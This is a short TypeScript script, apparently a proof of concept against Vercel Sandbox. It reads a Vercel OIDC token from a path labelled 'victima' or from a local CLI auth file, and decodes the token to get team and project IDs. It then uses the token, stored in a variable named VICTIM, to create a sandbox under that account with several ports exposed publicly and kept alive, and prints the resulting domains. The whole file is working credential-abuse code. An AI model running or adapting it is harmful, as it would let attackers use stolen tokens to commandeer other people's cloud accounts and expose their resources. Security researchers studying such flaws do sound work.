import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";

function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local", "utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json", "utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}

const VICTIM = loadToken();
let V: any;
try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const ports = [3000, 23456, 30001, 30002, 30003, 26661];
  console.log("creando sandbox con puertos:", ports.join(","));
  const sbx = await Sandbox.create({
    name: "expose-cp-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports,
  });
  console.log("DOMAIN_3000=" + sbx.domain(3000));
  for (const p of ports) {
    try {
      const d = sbx.domain(p);
      console.log(`DOMAIN_${p}=${d}`);
    } catch (e) {
      console.log(`DOMAIN_${p}=ERR ${(e as Error).message}`);
    }
  }
  console.log("KEEP_ALIVE=true");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });